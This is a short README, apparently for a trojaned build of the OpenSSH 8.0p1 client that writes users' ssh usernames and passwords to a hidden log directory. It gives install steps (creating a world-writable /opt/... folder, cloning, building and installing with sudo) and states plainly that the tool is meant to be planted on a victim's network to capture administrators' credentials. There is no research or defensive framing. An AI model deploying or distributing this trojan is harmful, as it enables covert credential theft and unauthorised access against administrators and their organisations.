# OPENSSH 8 TROJAN
This is trojanned version of openssh-8.0p1, the ssh client will log ssh username and ssh password into /opt/.../log.txt

# INSTALLATION
sudo mkdir -p /opt/...
sudo chmod 777 /opt/...

git clone https://github.com/bluedragonsecurity/openssh8_trojanned.git
cd openssh8_trojanned
./configure
make
sudo make install

# WHAT FOR IS THIS ?
this trojanned version of openssh can be installed on a victim's subnet which has many ssh access. 
Everytime the administrator using the ssh client and finish his session using **exit** command, the ssh client will log his username and password at /opt/.../log.txt


